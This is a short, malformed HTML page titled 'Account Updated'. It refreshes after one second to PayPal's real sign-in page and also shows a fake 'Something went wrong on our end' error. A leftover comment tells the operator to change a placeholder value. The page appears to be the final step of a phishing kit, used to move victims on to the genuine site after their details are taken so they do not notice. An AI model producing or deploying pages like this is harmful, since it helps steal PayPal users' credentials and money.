<!DOCTYPE html>

<html>

     <head>
     

  <link href='../../lib/img/favicon.ico' rel='icon' type='image/x-icon'/>

     
<title>Account Updated</title>   


<!-- Please Change "dzdz" !! --->
<meta content='1;URL=https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fcgi-bin%2Fwebscr%3fcmd%3d_account' http-equiv='refresh'/>

     </head>
<body>
<HEAD> <TITLE>Something went wrong on our end</TITLE> </HEAD>
<BODY>
  <center><p><IMG SRC="./something.JPG"></p></center>
</BODY>
</>
</body

</html>
